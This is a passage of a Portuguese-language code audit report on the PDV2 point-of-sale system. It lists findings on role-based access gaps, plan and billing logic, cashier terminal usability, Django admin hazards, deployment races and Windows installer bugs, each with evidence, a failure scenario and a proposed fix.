- **Correção:** Somar sempre os recebíveis de fiado (sale não nulo) no dashboard, ou omitir o quadro e os campos quando o plano não tiver 'finance' (devolver finance.enabled como em views_owner.py:116-120).

### Dashboard e lista de vendas não restringem papel: caixa e estoquista veem faturamento da empresa e totais de contas a pagar/receber

- **Onde:** `cloud/core/views_sales.py:105` · área `planos-permissoes-matriz` · categoria `security` · confirmado
- **Evidência:** dashboard, sales, sale_detail e sale_people usam membership_context(request) sem roles (l.26, 47, 59, 105); o dashboard devolve revenue_cents e open_payables/open_receivables. O menu 'Visão geral' inclui cashier e inventory (app.js:35). Já /finance exige READ = owner/admin/manager/finance/viewer (views_finance.py:12) e /cash-sessions exclui caixa (views_cash.py:9). /api/v1/stock também aceita qualquer papel (views_stock.py:31), o que expõe o saldo esperado na contagem cega de inventário.
- **Cenário de falha:** Operador de caixa entra no painel e vê faturamento do mês de todas as lojas, ticket médio, total de contas a pagar e a receber e todas as vendas com CPF dos clientes. Um caixa escalado para inventário cego consulta GET /api/v1/stock?shop_id=... e ajusta a contagem ao saldo do sistema.
- **Correção:** Definir roles explícitos nesses endpoints (ex.: dashboard financeiro só para owner/admin/manager/finance/viewer; caixa vê apenas as próprias vendas) e restringir /stock a STOCK_READ; alinhar tenantNav com a API.

### Administrador define o PIN do proprietário e pode desativar um coproprietário; a proteção do papel owner só vale para o campo 'role'

- **Onde:** `cloud/core/views_users.py:120` · área `planos-permissoes-matriz` · categoria `security` · confirmado
- **Evidência:** user_pin aceita MANAGE = owner/admin para qualquer membro (l.120-136), e o painel mostra 'Trocar PIN' na linha do proprietário mesmo para admin (web/assets/app.js:2494). Em user_detail, a checagem 'Somente proprietário altera papel de proprietário' só roda se 'role' estiver no corpo (l.100-104); 'active' e DELETE passam, limitados apenas por _last_owner (l.26-31).
- **Cenário de falha:** Um administrador troca o PIN do proprietário, entra no terminal como 'Proprietário' e cancela vendas ou aprova descontos; a auditoria local e os eventos sincronizados atribuem tudo ao dono. Em empresa com dois sócios owner, o admin envia DELETE /api/v1/users/<sócio> e o sócio perde acesso ao painel e ao caixa.
- **Correção:** Em user_pin e user_detail, exigir actor.role == 'owner' sempre que a linha alvo for owner (qualquer campo), e impedir admin de alterar PIN de papel igual ou superior ao seu.

### Terminal ignora plan_status e features do lease: empresa inadimplente não recebe aviso e o bloqueio aparece como 'conecte para renovar'

- **Onde:** `terminal/store.py:471` · área `planos-permissoes-matriz` · categoria `ux-bug` · confirmado
- **Evidência:** lease_status devolve plan_status e features (l.471), mas terminal.js não lê nenhum dos dois (0 ocorrências de plan_status/past_due/features). Em past_due a nuvem reduz o lease para 24h (cloud/core/views_terminal.py:86) e depois recusa com 'Prazo de pagamento encerrado' (api_common.py:163-164); o terminal mostra só 'Prazo offline expirado; conecte para renovar' (store.py:463-465).
- **Cenário de falha:** Boleto vence na quinta. O caixa segue vendendo sem nenhum aviso; no domingo o terminal para com mensagem pedindo conexão. O lojista checa a internet, reinicia o computador e perde vendas, porque nada na tela diz que o motivo é pagamento pendente.
- **Correção:** Exibir no terminal faixa 'Pagamento pendente — o caixa para em DD/MM HH:MM' quando plan_status for past_due ou trial perto do fim, e diferenciar a mensagem de bloqueio por assinatura da de falta de conexão (guardar o último erro 403 do bootstrap).

### Cadastro de novas empresas depende do plano de slug 'essential' ativo; qualquer plano ativo é público e contratável; landing fixa três slugs

- **Onde:** `cloud/core/views_auth.py:143` · área `planos-permissoes-matriz` · categoria `correctness` · confirmado
- **Evidência:** register busca Plan(slug='essential', active=True) e devolve 503 se não achar (l.143-145). /api/v1/plans é público e lista todos os planos ativos com features (l.337-345); subscribe aceita qualquer plano ativo (operations/views.py:147). A landing só atualiza cards com data-plan essential/management/advanced e mantém o HTML fixo quando o plano não vem da API (web/assets/landing.js:25-27).
- **Cenário de falha:** A plataforma desmarca 'Plano disponível para novas assinaturas' no Essencial para lançar outro plano de entrada: todo cadastro novo passa a falhar com 'Plano inicial indisponível' e a landing continua anunciando Essencial a R$ 149 com a legenda 'Valores carregados da plataforma'. Um plano negociado para uma rede (ex.: 20 terminais a preço especial) aparece na lista pública e pode ser contratado por qualquer empresa.
- **Correção:** Adicionar ao Plan os campos 'público' e 'plano padrão do teste' (em vez de slug fixo), filtrar /plans e subscribe por planos públicos ou atribuídos à empresa, e gerar os cards da landing a partir da API.

### Nenhuma assinatura CrownTech em nenhuma superfície, e a tela de login informa ao cliente que 'PDV2 é nome provisório'

- **Onde:** `web/login.html:33` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** login.html:33 'PDV2 é nome provisório. Marca e domínio serão verificados antes do lançamento.'; :27 'O caixa local segue em validação técnica'; :88 'ainda exigem validação antes de uso comercial'. Marca só PDV2 em terminal/templates/index.html:9 e :15, landing.html:226 ('PDV2 · Maricá') e :228, manifest.webmanifest:3-5, offline.html:13, RootView.swift:151, Info.plist:10 (`br.com.pdv2.OwnerMonitor`). O comprovante termina em 'OBRIGADO PELA PREFERENCIA!' / 'Volte sempre' (terminal/printers.py:250-251) sem fornecedor. O único logotipo do repositório é logo-pdv2.svg.
- **Cenário de falha:** O cliente da loja olha a tela do caixa ou o cupom e não há como saber que o sistema é da CrownTech; nenhuma indicação nasce do PDV instalado. O lojista pagante lê a cada login que o nome é provisório e que o caixa está 'em validação'. Se o app for publicado com `br.com.pdv2.OwnerMonitor`, o identificador não pode mais ser trocado para o domínio da CrownTech.
- **Correção:** Criar o logotipo CrownTech (SVG) e um componente 'PDV2 · um produto CrownTech' aplicado em: index.html:15 (sob 'TERMINAL LOCAL') e rodapé dos cartões de pareamento e de login/bloqueio (linhas 28-62, a tela que fica exposta ao público); última linha do comprovante e dos vales em printers.py após a linha 251 ('Sistema PDV2 - CrownTech' + site); login.html:33 no lugar do aviso de nome provisório; rodapé da landing (228) com CNPJ e contato; rodapé da barra lateral do painel; manifest (name/description); offline.html; RootView.swift:151. Definir o bundle id definitivo antes do primeiro envio à App Store.

### Selos 'Offline' e 'Fila' somem abaixo de 1250px e ficam ilegíveis em 1366px para perfis com 5 abas

- **Onde:** `terminal/static/terminal.css:79` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** Linha 79: `@media(max-width:1250px){.top-status .badge:nth-child(2),.top-status .badge:nth-child(4){display:none}}` (networkBadge e pendingBadge, index.html:16). Linha 55: `.top-status{min-width:0;overflow:hidden;flex-wrap:nowrap}`. Medido com 5 abas: 1366x768 = `.top-status` com 127px e selos de 31/24/26/24px (na tela aparecem 'M…', 'O.', 'L…', 'F…'); 1280x1024 = 22px cada; 1024x768 = largura 0. Com perfil caixa (2 abas) em 1024px restam só empresa e licença, truncados.
- **Cenário de falha:** Internet da loja cai. Em monitor de 1024px ninguém vê 'Offline · dados locais' nem 'Fila: 37'; a aba Sistema é restrita a gerente. As vendas ficam dias sem subir e o dono só percebe quando o painel e o app mostram faturamento zerado. O alerta de horário (`#hoursAlert`) e o de versão nova são cortados pelo mesmo overflow.
- **Correção:** Unir os quatro selos num único indicador que nunca é ocultado (ponto colorido + 'Offline · 37 na fila'), com detalhe ao tocar. Remover a regra da linha 79. Reservar largura mínima para o indicador e encolher as abas antes dele.

### Só existe o atalho F2 no caixa; finalizar, pagar, dar desconto e cancelar exigem mouse ou toque, e a legenda é minúscula

- **Onde:** `terminal/templates/index.html:68` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** index.html:68 `<span class="shortcut-hint"><kbd>F2</kbd> buscar <kbd>Enter</kbd> adicionar</span>`; fonte de 11px e kbd de 10px (terminal.css:21), oculta em <=850px (linha 23). Em terminal.js o único F tratado é `if(event.key==='F2')` (linha 487); os demais handlers de teclado cobrem apenas Escape/Enter/Tab dentro dos diálogos.
- **Cenário de falha:** Operador com leitor e teclado bipa os produtos e, a cada venda, precisa pegar o mouse para clicar em 'Revisar e confirmar venda', escolher a forma de pagamento e confirmar. Em horário de pico isso vira fila, e quem vem de outro PDV de mercado procura F4/F8/F12 e não encontra.
- **Correção:** Mapa central de atalhos em terminal.js (sugestão: F2 buscar, F3 quantidade, F4 desconto, F5 cliente/CPF, F6 vendedor, F7 sangria/suprimento, F8 pagamento, F9 dinheiro, F10 Pix, F11 cartão, F12 confirmar, Del remover item, Esc cancelar; 1-5 para a forma dentro do diálogo), com `preventDefault` nos F do navegador. Renderizar a legenda a partir do mesmo mapa numa barra fixa no rodapé do caixa com teclas de 14px ou mais, e mostrar a tecla em cada botão (ex.: 'Finalizar F8').

### Landing mantém o card de um plano desativado ou renomeado com o preço antigo, nunca exibe planos novos e ainda afirma que os valores vieram da plataforma

- **Onde:** `web/assets/landing.js:27` · área `layout-marca-landing` · categoria `money` · confirmado
- **Evidência:** `const plan=plans.find(item=>item.slug===card.dataset.plan); if(!plan)return;` (linhas 26-27) deixa o card com o valor da primeira renderização (starterPlans, linhas 4-8) e com o HTML fixo de landing.html:172-174. A API só devolve `Plan.objects.filter(active=True)` (cloud/core/views_auth.py:339). Mesmo assim a linha 88 escreve 'Valores e limites carregados da plataforma'. Só existem três cards fixos (`data-plan` essential/management/advanced).
- **Cenário de falha:** No admin do SaaS o plano 'advanced' é desativado e é criado um 'pro' de R$ 449. A landing segue vendendo 'Avançado R$ 349,00' como carregado da plataforma e o 'pro' não aparece. O visitante se cadastra esperando um preço e um limite que não existem mais.
- **Correção:** Gerar os cards a partir da resposta de /api/v1/plans (template único, destaque por campo do plano) e ocultar cards sem plano ativo. Usar starterPlans só quando a API falhar, com aviso claro. Acrescentar ordem e destaque ao modelo Plan para o admin controlar a vitrine.

### Pacotes com equipamentos têm preço fixo no HTML, não existem no banco e não há nenhum canal para pedir proposta

- **Onde:** `web/landing.html:182` · área `layout-marca-landing` · categoria `money` · confirmado
- **Evidência:** landing.html:182-184 traz 'R$ 699', 'R$ 1.299' e 'R$ 1.899' escritos no HTML; não há entidade de equipamento em cloud/core/models.py nem nas views. O botão da seção (linha 186) é 'Conhecer o sistema' para /login/?mode=register, e a linha 187 diz que o pacote 'é contratado mediante proposta'. Busca por wa.me, whatsapp, mailto: e tel: em landing.html, login.html, app.html, landing.js e auth.js retorna zero ocorrências.
- **Cenário de falha:** Dono de mercearia quer o caixa completo de R$ 699/mês, a oferta de maior valor. Não encontra telefone, WhatsApp, e-mail nem formulário; o único caminho é criar uma conta de teste de software, e o pedido de proposta nunca chega à CrownTech. Um reajuste de preço exige editar HTML e publicar de novo.
- **Correção:** Cadastrar as ofertas de equipamento no admin do SaaS e servi-las pela API. Trocar o botão por 'Pedir proposta' com formulário curto (nome, WhatsApp, cidade, número de caixas) gravado como lead e avisado por e-mail, mais um botão de WhatsApp da CrownTech no cabeçalho, na seção de planos e no rodapé.

### A escolha de plano na landing se perde: todo botão leva ao mesmo cadastro, que sempre cria teste de 14 dias no Essencial

- **Onde:** `web/landing.html:173` · área `layout-marca-landing` · categoria `correctness` · confirmado
- **Evidência:** Os três cards (linhas 172-174) apontam para `/login/?mode=register` sem identificar o plano. auth.js:236-241 envia só company/name/email/password. O servidor fixa `Plan.objects.filter(slug="essential")` e `trial_ends_at = now + 14 dias` (cloud/core/views_auth.py:143-153). O Essencial semeado não tem `finance` nem `reports` (migrations/0002_seed_plans.py:7-8). O prazo de 14 dias não aparece na landing nem em login.html:83.
- **Cenário de falha:** Visitante clica em 'Criar conta de teste' no card em destaque 'Gestão' (Financeiro, comissão, relatórios). Entra no painel num teste Essencial em que justamente essas telas estão bloqueadas, não consegue avaliar o plano que escolheu e, no 15º dia, o teste expira sem que tenha sido avisado do prazo.
- **Correção:** Passar `?plan=<slug>` nos botões, mostrar no cadastro o plano escolhido e '14 dias grátis', aceitar `plan` em /auth/register validando plano ativo (ou liberar todos os recursos durante o teste) e avisar o fim do teste no painel e por e-mail.

### Cadastro coleta dados pessoais sem política de privacidade, termos de uso ou registro de aceite

- **Onde:** `web/login.html:78` · área `layout-marca-landing` · categoria `security` · confirmado
- **Evidência:** O formulário de cadastro (linhas 78-85) pede empresa, nome, e-mail e senha, sem caixa de aceite nem links. As classes `.auth-privacy` existem em web/assets/ui.css:157-159 e não são usadas em nenhum HTML. O rodapé da landing (landing.html:228) só tem a marca e 'Acessar painel'. Busca por 'privacidade', 'termos de uso' e 'lgpd' em landing.html, login.html, app.html, auth.js e app.js retorna zero.
- **Cenário de falha:** Ao ligar a cobrança por boleto (Asaas) e cartão (Stripe), um cliente contesta a cobrança ou pede exclusão dos dados: não existe termo aceito nem registro de consentimento para apresentar. A coleta sem informar finalidade e controlador contraria a LGPD, e os provedores de pagamento costumam exigir termos e política publicados no site.
- **Correção:** Publicar /termos e /privacidade com CrownTech como controladora (CNPJ e contato do encarregado), linkar no rodapé da landing e do login, incluir caixa obrigatória no cadastro usando `.auth-privacy` e gravar versão do termo, data e IP no Tenant/auditoria.

### App iOS usa cor de texto escura fixa sobre fundos adaptativos: título do painel e do login ficam ilegíveis no modo escuro

- **Onde:** `ios/PDV2OwnerMonitor/PDV2OwnerMonitor/OwnerDashboardView.swift:80` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** `PDVTheme.ink = Color(red:0.08, green:0.12, blue:0.19)` é fixo (DesignSystem.swift:8). 'Visão geral' usa `.foregroundStyle(PDVTheme.ink)` (linha 80) sobre `Color(uiColor: .systemGroupedBackground)` (linha 20), que é preto no modo escuro. 'Entrar no monitoramento' (RootView.swift:72-74) usa a mesma cor sobre `.regularMaterial`. Não há `preferredColorScheme` no código nem `UIUserInterfaceStyle` no Info.plist.
- **Cenário de falha:** Proprietário com iPhone em modo escuro abre o app: o título 'Visão geral' fica azul-marinho quase preto sobre fundo preto e o título do cartão de login some sobre o material escuro. Os demais textos usam cores do sistema e aparecem, o que deixa a tela com aparência de defeito.
- **Correção:** Definir ink e muted como cores adaptativas (Color Set claro/escuro no Assets.xcassets ou `Color(uiColor: .label)` / `.secondaryLabel`). Se não houver tempo de desenhar o tema escuro, fixar `UIUserInterfaceStyle = Light` no Info.plist.

### O troco aparece em 12px no diálogo de confirmação e depois só num aviso passageiro

- **Onde:** `terminal/static/terminal.css:180` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** `.checkout-change{...font-size:12px;font-weight:800}` (linha 180) estiliza `#changeText` (index.html:110, preenchido em terminal.js:331 com 'Troco: R$ …' ou 'Falta: R$ …'). No mesmo diálogo o total usa 31px (linha 187) e no carrinho 34px (linha 177). Após a venda o troco aparece só no toast 'Venda concluída … · Troco …' (terminal.js:362), no canto inferior, e na prévia do cupom em fonte Courier.
- **Cenário de falha:** Cliente paga R$ 103,20 com R$ 150. O operador digita 150,00 e o valor a devolver aparece em letra de 12px no canto do diálogo; em monitor de 15" a 60cm ele lê errado ou não vê, confirma e o toast some em segundos. Sobra a conta de cabeça, com diferença no fechamento do caixa.
- **Correção:** Mostrar o troco como segundo bloco de destaque ao lado do total no diálogo (28px ou mais; verde para troco, âmbar para 'Falta'), atualizado a cada tecla. Após confirmar, manter 'Troco R$ 46,80' em destaque no diálogo do comprovante até o operador fechar.

### Alvos de toque pequenos no caixa: remover item tem 22x28px, e a remoção é imediata para gerente

- **Onde:** `terminal/static/terminal.css:21` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** `.cart-row{grid-template-columns:minmax(0,1fr) 70px 76px 22px}` (linha 21) e `.remove{border:0;background:transparent;font-size:22px}` sem padding (linha 1); medido 22x28px, colado ao total da linha. Outros alvos medidos: campo de quantidade 70x35, 'Nova venda' 88x30 (`.small{min-height:30px}`), abas do topo com 33px de altura, 'Dividir pagamento' em fonte de 10px. Em terminal.js:329 a remoção só pede PIN quando o perfil é cashier; para os demais executa direto, sem confirmação nem desfazer.
- **Cenário de falha:** Em tela touch, o gerente cobrindo o caixa tenta tocar na quantidade ou no total de uma linha e acerta o '×': o item sai do pedido sem aviso e o cliente leva o produto sem pagar. Para o operador comum o mesmo erro abre o diálogo de PIN do gerente no meio do atendimento.
- **Correção:** Alvo mínimo de 44x44px para o '×' (coluna de 44px com padding) e para os demais controles do caixa; linhas do carrinho com 56px ou mais. Trocar a exclusão imediata por um aviso com 'Desfazer' de 5 segundos. Usar `@media (pointer:coarse)` para ampliar chips, abas e botões pequenos.

### Editar loja/empresa de um Terminal no admin trava o caixa: identidade dos eventos e da licença deixa de bater

- **Onde:** `cloud/core/admin.py:35` · área `admin-django-migracoes-dados` · categoria `correctness` · confirmado
- **Evidência:** TerminalAdmin (35-39) só protege token_hash e pairing_code_hash; tenant, shop e revoked são editáveis. O sync exige `identity == {tenant_id, shop_id, terminal_id}` do registro atual (views_terminal.py:371-374), e o terminal só aceita licença com os ids fixados no pareamento (terminal/store.py:577-582; shared/licensing.py:99-101). O admin também reativa/cria terminal sem checar `plan.terminal_limit` (a API checa em views_terminal.py:186-189 e views_platform.py:447-450).
- **Cenário de falha:** Suporte 'move' um caixa para outra loja pelo /control/. A partir daí todo lote de sync volta 403 'Identidade do evento não corresponde ao terminal' e o bootstrap é rejeitado no caixa ('Licença do catálogo inválida'): as vendas ficam presas na fila local, a licença não renova e o caixa para em até 72h; re-parear é bloqueado ('Este dispositivo já está pareado'). Se o campo trocado for `tenant`, a resposta do bootstrap ainda entrega ao aparelho o catálogo, clientes e hashes de PIN da outra empresa (views_terminal.py:271-309).
- **Correção:** Tornar tenant/shop readonly no admin (mudança de loja = revogar e parear de novo) e passar reativação/criação pela regra de limite do plano, com AuditEvent.

### Baixar limites ou renomear o código de um plano pelo admin bloqueia renovações já pagas e o cadastro de novas empresas

- **Onde:** `cloud/core/admin.py:19` · área `admin-django-migracoes-dados` · categoria `money` · confirmado
- **Evidência:** PlanAdmin deixa slug, terminal_limit e shop_limit livres. A API recusa reduzir limite abaixo do uso (views_platform.py:271-278) e não permite alterar slug (views_platform.py:266). `reconcile_payment` só renova se `capacity_fits(binding.tenant, binding.plan)` (operations/services.py:94-95, 106). O cadastro busca `Plan.objects.filter(slug="essential", active=True)` (views_auth.py:143).
- **Cenário de falha:** Staff reduz terminal_limit de 2 para 1 no /control/. Na próxima mensalidade de cada empresa com 2 caixas, o Asaas confirma o pagamento, mas o job cai em needs_review ('Pagamento confirmado, mas plano abaixo do uso atual') e a assinatura não é estendida: o cliente pagou e perde a licença após a carência. Se o slug 'essential' for renomeado, todo novo cadastro responde 503 'Plano inicial indisponível'.
- **Correção:** Deixar slug readonly e aplicar no `clean()` do modelo/admin a mesma checagem de uso atual da API; ou tornar Plan somente leitura no admin e manter a edição pela rota /api/v1/platform/plans.

### Status de FiscalDocument editável no admin libera cancelamento de venda com nota autorizada e diverge de Sale.fiscal_status

- **Onde:** `cloud/core/admin.py:51` · área `admin-django-migracoes-dados` · categoria `correctness` · confirmado
- **Evidência:** FiscalDocument entra no `admin.site.register(model)` padrão (49-52), com status, authorization e sale editáveis. O único caminho correto atualiza documento e venda juntos sob lock (operations/services.py:152-160), e `reverse_sale` só bloqueia o cancelamento se o documento estiver 'authorized'/'cancel_pending' (sale_logic.py:199-200).
- **Cenário de falha:** Para 'destravar' uma venda, o staff muda o status do documento de authorized para rejected/cancelled no admin. O lojista cancela a venda no painel ou no caixa (estoque e fiado são revertidos), mas a NFC-e continua autorizada no provedor/SEFAZ: imposto devido sobre venda cancelada. Sale.fiscal_status permanece 'authorized', e os relatórios passam a discordar do documento.
- **Correção:** Registrar FiscalDocument como ReadOnlyAdmin; correções de estado devem passar por `fiscal.poll` (consulta ao provedor) via /api/v1/ops/jobs/<id>/reconcile.

### Formulários do admin montam <select> com todas as vendas/clientes/usuários de todas as empresas e estouram o timeout do gunicorn

- **Onde:** `cloud/core/admin.py:49` · área `admin-django-migracoes-dados` · categoria `performance` · confirmado
- **Evidência:** Os modelos das linhas 49-52 não definem raw_id_fields nem autocomplete_fields. FinanceEntry tem FK para Sale, Customer e Supplier (models.py:620-630) e FiscalDocument para Sale (models.py:717); Membership para User. O Django renderiza cada FK como <select> com a tabela inteira. A nuvem roda com 3 workers, 2 threads e timeout de 60s (infra/Dockerfile.cloud:16).
- **Cenário de falha:** Com algumas centenas de milhares de vendas na base, abrir /control/core/fiscaldocument/<id>/change/ ou qualquer FinanceEntry carrega todas as Sale em memória para montar as opções: a requisição passa de 60s, o worker é morto e o consumo de RAM dispara. Algumas tentativas seguidas ocupam os 3 workers e o sync dos terminais e o painel de todos os clientes ficam indisponíveis.
- **Correção:** Definir `raw_id_fields` (ou autocomplete com search_fields) para todo FK de tabela grande e `list_select_related`/`show_full_result_count = False` nas listagens.

### reconcile_stock --fix grava um total calculado antes da transação e pode criar divergência em saldo correto durante a sincronização de vendas

- **Onde:** `cloud/core/management/commands/reconcile_stock.py:15` · área `admin-django-migracoes-dados` · categoria `concurrency` · confirmado
- **Evidência:** `rows = drift()` roda fora da transação (linha 15) e `drift()` faz duas consultas separadas, soma dos movimentos e leitura dos saldos (stock_balance.py:52-56). Depois, `update_or_create(..., defaults={"quantity_milli": ledger})` (linhas 22-23) grava o valor ABSOLUTO lido antes. O update_or_create até bloqueia a linha, mas o número já está velho; a venda aplica `F("quantity_milli") + delta` na mesma transação do movimento (stock_balance.py:23-24).
- **Cenário de falha:** Comando rodado com a loja aberta. Uma venda de 1 unidade confirma entre as duas consultas do drift(): o histórico lido não tem o movimento, o saldo lido já tem; a linha aparece como divergente e o --fix devolve a unidade ao saldo. Resultado: o comando informa '1 divergência corrigida' e deixa o estoque 1 acima do real; o caixa mostra produto que não existe e o alerta de estoque negativo deixa de disparar. Sem --fix, o mesmo falso positivo faz o comando sair com código 1.
- **Correção:** Detectar a divergência em uma única instrução SQL (join do agregado de movimentos com StockBalance) e, na correção, para cada par: abrir transação, `select_for_update` na linha do saldo, recalcular a soma dos movimentos DEPOIS do lock e só então gravar.

### Deploy sem drenagem: a nuvem antiga continua recebendo sync durante e depois do migrate, e uma migração que falha deixa código antigo sobre schema parcial

- **Onde:** `compose.production.yaml:49` · área `admin-django-migracoes-dados` · categoria `data-loss` · confirmado
- **Evidência:** `migrate` roda `manage.py migrate --noinput` e `cloud` só é recriado após `service_completed_successfully` (linhas 49-57). Num `docker compose up -d` (fluxo do Dokploy), o container antigo de cloud segue atendendo até ser recriado. Os backfills leem um retrato e não bloqueiam escrita: 0028 (linhas 9-13) e 0024 (linhas 32-34). Colunas novas são NOT NULL sem default no banco (0033 linhas 15-24; 0023 linhas 14-17). Cada migração confirma em transação própria e todo RunPython tem reverso noop.
- **Cenário de falha:** a) Movimentos de estoque gravados pelo código antigo entre o retrato da 0028 e a troca do container não entram em StockBalance (o código antigo não tem o sinal de stock_balance.py:15): saldo errado até alguém rodar reconcile_stock. O mesmo vale para eventos cash.* aceitos pelo código antigo após a 0024: ficam em SyncEvent, o terminal já recebeu o ACK e o turno nunca aparece em CashSession. b) Se uma migração falhar no meio, o cloud novo não sobe e o antigo fica rodando sobre as migrações já confirmadas: todo INSERT de venda falha por NOT NULL na coluna nova e a sincronização de todos os terminais para até intervenção manual. Não há backup automático antes do migrate (o backup é horário).
- **Correção:** Antes do migrate, parar cloud e worker (ou ativar modo manutenção que responda 503 em /api/v1/terminal/sync; o terminal reenvia depois) e disparar um backup. Usar `db_default` nas colunas novas para o código antigo continuar inserindo. Em backfills, bloquear a tabela de origem (`LOCK TABLE ... IN SHARE MODE`) ou reexecutar a conciliação logo após a troca.

### Sem versão de contrato terminal-nuvem: validação por lista fechada + fila em ordem travam o caixa quando as versões divergem, e voltar a imagem anterior quebra o sync

- **Onde:** `cloud/core/sale_logic.py:38` · área `admin-django-migracoes-dados` · categoria `correctness` · confirmado
- **Evidência:** `fields()` rejeita qualquer chave fora da lista (sale_logic.py:38-39 e 62-63; views_terminal.py:362-438). O terminal atual sempre envia `promo_discount_cents` na venda (terminal/store.py:1252-1256). O envio é em lotes de 50, tudo ou nada, sempre os mesmos primeiros eventos, sem fila de descarte (terminal/sync.py:136-155). A versão do terminal só é gravada (views_terminal.py:321-322) e PDV_VERSION tem padrão fixo 2.0.0 (compose.production.yaml:6, 26). docs/DEPLOY-DOKPLOY.md:39 orienta manter a imagem anterior para reversão.
- **Cenário de falha:** Terminais atualizados para a versão com promoções antes da nuvem (ou nuvem revertida para a imagem anterior após um problema): toda venda leva 400 'Campos inválidos ou ausentes', o lote inteiro é recusado e nenhuma venda, sangria ou fechamento posterior sobe. Na reversão há ainda o INSERT de venda falhando por `promo_discount_cents` NOT NULL sem default (0033). O painel fica sem vendas até alguém perceber. O sentido inverso (terminal antigo, nuvem nova) funciona hoje porque os campos novos entraram como opcionais, mas nada impede que o próximo campo obrigatório repita o problema. Como a tag da imagem não muda sem PDV_VERSION, a 'imagem anterior' é sobrescrita no rebuild.
- **Correção:** Enviar `contract_version` no sync/heartbeat e responder com erro específico (426) quando incompatível, exibido no caixa. Ignorar chaves desconhecidas em vez de recusar (ou versionar a lista). Isolar o evento recusado em quarentena para não bloquear os seguintes. Exigir PDV_VERSION explícito no compose e documentar reversão com `migrate` para trás.

### Thread de sincronização/impressão do terminal morre em silêncio com qualquer exceção fora da lista e nada a reinicia

- **Onde:** `terminal/sync.py:210` · área `testes-ci-distribuicao` · categoria `concurrency` · confirmado
- **Evidência:** Worker.run captura só `(TerminalError, OSError, ValueError)` em cada bloco (l.218-246); `sqlite3.Error` entra apenas no bloco do backup. store.py não converte erros do SQLite (connection/transaction, l.213-234). `self.store.meta()` (l.225) e `self.store.set_sync_result(...)` (l.248) estão fora de qualquer try. A thread é daemon, iniciada uma vez em create_app (app.py:455-458), sem supervisão; no Windows o processo é um .cmd no atalho de Inicialização (install-windows.ps1:54-60), sem serviço nem reinício.
- **Cenário de falha:** Disco lento ou antivírus segura o arquivo por mais de 10 s (busy_timeout) enquanto o worker faz begin_print ou set_sync_result: sqlite3.OperationalError 'database is locked' encerra a thread. O caixa continua vendendo, mas comprovantes param de imprimir, eventos não sobem, heartbeat e backup diário param, até alguém reiniciar o programa. O selo mostra apenas 'Fila: N' crescendo.
- **Correção:** Envolver o corpo do laço em `except Exception` com registro do erro e backoff (nunca sair do while); incluir sqlite3.Error; expor em /api/session se a thread está viva e recriá-la quando não estiver; no Windows instalar como serviço (NSSM/WinSW ou Tarefa Agendada com reinício em falha) em vez de atalho.

### Lançador do Windows é gravado em ASCII: pasta de usuário com acento gera caminhos corrompidos e o terminal não inicia

- **Onde:** `terminal/install-windows.ps1:53` · área `testes-ci-distribuicao` · categoria `correctness` · confirmado
- **Evidência:** `$InstallDir = (Join-Path $env:LOCALAPPDATA "PDV2")` (l.3) e `[System.IO.File]::WriteAllText($Launcher, $LauncherText, [System.Text.Encoding]::ASCII)` (l.53). O texto contém $DataDir, $AppDir e $PythonExe (l.52). A codificação ASCII do .NET troca todo caractere não ASCII por '?'.
- **Cenário de falha:** Computador da loja com usuário 'João' ou 'Conceição': LOCALAPPDATA = C:\Users\João\AppData\Local. O PDV2-Terminal.cmd fica com `C:\Users\Jo?o\...\python.exe`; ao abrir, o Windows responde que o caminho não existe e o caixa não sobe. O instalador termina com 'Instalado em ...' sem acusar nada.
- **Correção:** Gravar o .cmd na página de código OEM (`[Text.Encoding]::GetEncoding([Globalization.CultureInfo]::CurrentCulture.TextInfo.OEMCodePage)`) ou em UTF-8 sem BOM com `chcp 65001 >nul` na primeira linha; melhor ainda, instalar em caminho fixo sem acento (%ProgramData%\PDV2) e validar o lançador executando-o com um comando de verificação ao final do instalador.

### Atualização pelo instalador é destrutiva e sem volta: apaga o código antes de criar o venv e não para o terminal em execução

- **Onde:** `terminal/install-windows.ps1:38` · área `testes-ci-distribuicao` · categoria `data-loss` · confirmado
- **Evidência:** Sequência: backup do banco (l.13-35) -> `Remove-Item $Previous -Recurse -Force` de terminal/ e shared/ (l.38-41) -> cópia do novo código (l.42-43) -> `py -3.12 -m venv $Venv` e `throw` em falha (l.45-46) -> pip install (l.48-49). Não há parada do processo, pasta de preparação nem restauração da versão anterior.
- **Cenário de falha:** Com -Autostart o terminal está sempre rodando quando alguém atualiza. O python.exe do venv está em uso, e recriar o venv por cima tende a falhar com 'Permission denied' no Windows: o script aborta na l.46 depois de já ter trocado o código e sem rodar o pip. O processo em memória segue com código antigo e arquivos estáticos novos; no próximo boot, se a versão nova exigir uma dependência nova (por exemplo o tzdata do achado acima), o caixa não abre e a versão anterior já foi apagada.
- **Correção:** Instalar em pasta versionada (app-2.1.0, venv próprio), encerrar o processo antes (ou exigir que esteja parado, com caixa fechado e fila sincronizada), só trocar o ponteiro do lançador depois de `pip install` e de um teste de importação (`python -c "import terminal.app"`) passarem, e manter a pasta anterior para retorno.

### Versão é uma constante: VERSION parado em 2.0.0 desde 29/09, o terminal nunca lê o arquivo e as imagens Docker são sobrescritas na mesma tag

- **Onde:** `terminal/sync.py:15` · área `testes-ci-distribuicao` · categoria `maintainability` · confirmado
- **Evidência:** `VERSION = os.environ.get("PDV_VERSION", "2.0.0")`; o lançador do Windows não define PDV_VERSION (install-windows.ps1:52) e o instalador não copia o arquivo VERSION. `git log -- VERSION` mostra um único commit (29/09), embora fiado, devoluções e promoções tenham entrado depois. compose.production.yaml:26 usa `image: pdv2-cloud:${PDV_VERSION:-2.0.0}` e o CI constrói `pdv2-cloud:ci` sem publicar. package_terminal.py:17 gera metadados com `channel: pilot`, mas o terminal só consulta e aceita `stable` (sync.py:117, 128). O selo de versão aparece sempre que existe release, sem comparar com a instalada (terminal.js:198).
